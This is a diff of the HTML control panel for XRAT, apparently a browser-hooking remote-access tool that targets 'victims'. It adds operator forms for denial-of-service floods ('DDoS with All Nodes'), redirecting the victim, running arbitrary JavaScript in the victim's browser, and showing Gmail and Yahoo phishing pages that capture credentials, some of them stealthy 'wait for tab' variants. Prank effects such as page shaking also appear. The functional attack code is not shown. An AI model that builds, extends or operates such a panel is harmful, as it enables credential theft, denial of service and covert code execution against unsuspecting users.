@@ -198,13 +198,7 @@
 
                 <div class="btn-stack-group">
                     
-                    <button class="btn btn-large btn-block btn-primary" type="button">Cause BSOD!</button>
-                    <button class="btn btn-large btn-block" type="button">Preview BSOD!</button>
-
-                    <div class="page-header"></div>
-
-                    <button class="btn btn-large btn-block btn-inverse" type="button">Cause Fullscreen BSOD!</button>
-                    <button class="btn btn-large btn-block" type="button">Preview Fullscreen BSOD!</button>
+                    <button class="btn btn-large btn-block btn-primary" type="button" ng-click="sendBlueScreen()">Cause BSOD!</button>
                     
                 </div>
               </div>
@@ -256,25 +250,6 @@
           </div>
 
 
-          <div class="accordion-group">
-            <div class="accordion-heading">
-              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFive">
-                Chat <i class="icon-comment pull-right"></i>
-              </a>
-            </div>
-            <div id="collapseFive" class="accordion-body collapse">
-              <div class="accordion-inner">
-                <h4>Open up a chat session with your victim <small> - Maybe get to know em</small></h4>
-                <div class="alert alert-info fade in">
-                  <button type="button" class="close" data-dismiss="alert">×</button>
-                  <strong>Note:</strong> This module will be highly dependent on the polling speed of the victims client. Try setting it to something like 1000 milliseconds or lower for this module.
-                </div>
-                <p>Opens up a small window in the corner of your victims screen, displaying messages you've written to them as well as allowing them to send messages back.</p>
-              </div>
-            </div>
-          </div>
-
-
 
           <div class="accordion-group">
             <div class="accordion-heading">
@@ -286,6 +261,41 @@
               <div class="accordion-inner">
                 <h4>Vandalize your victim's current webpage</h4>
                 <p>Either replace the entire body block of html on the page, or use jQuery to target certain bits of html and change it in javascript.</p>
+              </div>
+            </div>
+          </div>
+
+
+
+          <div class="accordion-group">
+            <div class="accordion-heading">
+              <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseFive">
+                Denial of Service (DoS) <i class="icon-comment pull-right"></i>
+              </a>
+            </div>
+            <div id="collapseFive" class="accordion-body collapse">
+              <div class="accordion-inner">
+                <h4>Cause a denial of service by issuing many requests to a target.<small> - Make that a DDoS with "All Nodes"</small></h4>
+                <p>It is recommended you only target servers that you control so as not to cause damage, or go to jailz.</p>
+                <form class="form-horizontal" name="dosform" ng-submit="sendDoS()">
+                    <div class="control-group">
+                        <label class="control-label" for="dostarget">Target:</label>
+                        <div class="controls">
+                            <input type="text" id="dostarget" placeholder="http://target.com:80/something.php" ng-model="dostargetText" required>
+                        </div>
+                    </div>
+                   <div class="control-group">
+                        <label class="control-label" for="dosrequests">Requests (0 for no limit):</label>
+                        <div class="controls">
+                            <input type="number" id="dosrequests" placeholder="0" ng-model="dosrequestsText" required>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Start the DoS</button>
+                        </div>
+                    </div>
+                </form>
               </div>
             </div>
           </div>
@@ -378,6 +388,28 @@
             <div id="collapseNine" class="accordion-body collapse">
               <div class="accordion-inner">
                 <h4>Redirect their browser to any location on the web</h4>
+                <form class="form-horizontal" name="redirectform" ng-submit="sendRedirect()">
+                    <div class="control-group">
+                        <label class="control-label" for="redirect">Redirect Location:</label>
+                        <div class="controls">
+                            <input type="text" id="redirect" placeholder="http://target.com/something.php" ng-model="redirectText" required>
+                        </div>
+                    </div>
+                   <div class="control-group">
+                      <label class="control-label" for="redirectmethod">Redirect Method:</label>
+                      <div class="controls">
+                          <select name="redirectmethod" id="redirectmethod" required ng-model="redirectmethod">
+                            <option value="iframe">Iframe</option>
+                            <option value="replace">Replace Page</option>
+                          </select>
+                      </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send Redirect</button>
+                        </div>
+                    </div>
+                </form>
               </div>
             </div>
           </div>
@@ -409,6 +441,21 @@
               <div class="accordion-inner">
                 <h4>A Command Line-ish Experience</h4>
                 <p>Write some raw javascript commands and have the victim execute it and return the results. Like the Chat module, you will want to lower the victim's poll speed to a latency you are comfortable with.</p>
+
+                <form name="shellform" class="form-horizontal" ng-submit="sendShell()">
+                    <div class="control-group">
+                        <label for="shellinput" class="control-label">Raw Javascript:</label>
+                        <div class="controls">
+                            <textarea id="shellinput" rows="15" ng-model="shellinputText" required></textarea>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send Javascript</button>
+                        </div>
+                    </div>
+                </form>
+
               </div>
             </div>
           </div>
@@ -423,9 +470,30 @@
             </div>
             <div id="collapseEleven" class="accordion-body collapse">
               <div class="accordion-inner">
-                <h4>Targeted Phishing Attacks</h4>
-                <p>These phishing attacks can either be fairly obvious or somewhat stealthy. You can immediately redirect your victims to these pages. Or you could instruct the script to wait for them to switch to another tab and then change the page and tab title to the phishing page.</p>
-                <p>As development on XRAT progresses more and more phishing pages will be built. Future pages will include Google, Facebook, Yahoo, and Bank phishing pages. Also hope to have the gmail notification popup included.</p>
+                <div class="page-header"><h4>Targeted Phishing Attacks</h4>
+                <p>These phishing attacks can either be fairly obvious or somewhat stealthy. You can immediately redirect your victims to these pages. Or you could instruct the script to wait for them to switch to another tab and then change the page and tab title to the phishing page.</p></div>
+                
+
+                <h4>Gmail/Google</h4>
+                <p>Throw up a gmail login page to capture credentials entered. Gmail phishing will soon have a fake DOM-based web-notification alerting the user of a message, that when clicked loads the phishing page.</p>
+
+                <div class="btn-stack-group">
+                        
+                    <button class="btn btn-large btn-block btn-primary" type="button" ng-click="sendGooglePhish(0)">Phish for Google!</button>
+                    <button class="btn btn-large btn-block btn-inverse" type="button" ng-click="sendGooglePhish(1)">Phish for Google by Waiting for Tab!</button>
+                        
+                </div>
+
+                <h4>Yahoo/YMail</h4>
+                <p>Like the google phishing attack, brings up a single yahoo login page in the same manner. No web notifications however.</p>
+
+                <div class="btn-stack-group">
+                        
+                    <button class="btn btn-large btn-block btn-primary" type="button" ng-click="sendYahooPhish(0)">Phish for Yahoo!</button>
+                    <button class="btn btn-large btn-block btn-inverse" type="button" ng-click="sendYahooPhish(1)">Phish for Yahoo by Waiting for Tab!</button>
+                        
+                </div>
+
               </div>
             </div>
           </div>
@@ -459,12 +527,52 @@
                 
 
                 <h4>EarthQuake</h4>
-                <p>This effect shakes the users screen according to some settings that you can specify.</p>
+                <p>This effect causes the html element you select to shake in the victims browser. To shake the whole screen just select 'body'. (Use css selectors like you would in jquery)</p>
+
+                <form class="form-horizontal" name="earthquakeform" ng-submit="sendEarthquake()">
+                    <div class="control-group">
+                        <label class="control-label" for="eqelement">Target Element:</label>
+                        <div class="controls">
+                            <input type="text" id="eqelement" placeholder="body" ng-model="eqelementText" required>
+                        </div>
+                    </div>
+                   <div class="control-group">
+                        <label class="control-label" for="eqduration">Requests (In ms. 0 for no limit):</label>
+                        <div class="controls">
+                            <input type="number" step="50" min="0" id="eqduration" placeholder="0" ng-model="eqdurationText" required>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Send the Earthquake</button>
+                        </div>
+                    </div>
+                </form>
 
 
+                <h4>Upside Down</h4>
+                <p>This effect flips the html element you select upside down in the victims browser.</p>
 
-                <h4>Snowflakes</h4>
-                <p>This effect caues snowflakes to fall across the users screen according to some settings that you can specify.</p>
+                <form class="form-horizontal" name="upsidedownform" ng-submit="sendUpsidedown()">
+                    <div class="control-group">
+                        <label class="control-label" for="udelement">Target Element:</label>
+                        <div class="controls">
+                            <input type="text" id="udelement" placeholder="body" ng-model="udelementText" required>
+                        </div>
+                    </div>
+                   <div class="control-group">
+                        <label class="control-label" for="udduration">Requests (In ms. 0 for no limit):</label>
+                        <div class="controls">
+                            <input type="number" step="50" min="0" id="udduration" placeholder="1000" ng-model="uddurationText" required>
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <div class="controls">
+                            <button type="submit" class="btn btn-large btn-primary">Flip Page Upside Down</button>
+                        </div>
+                    </div>
+                </form>
+
               </div>
 
 
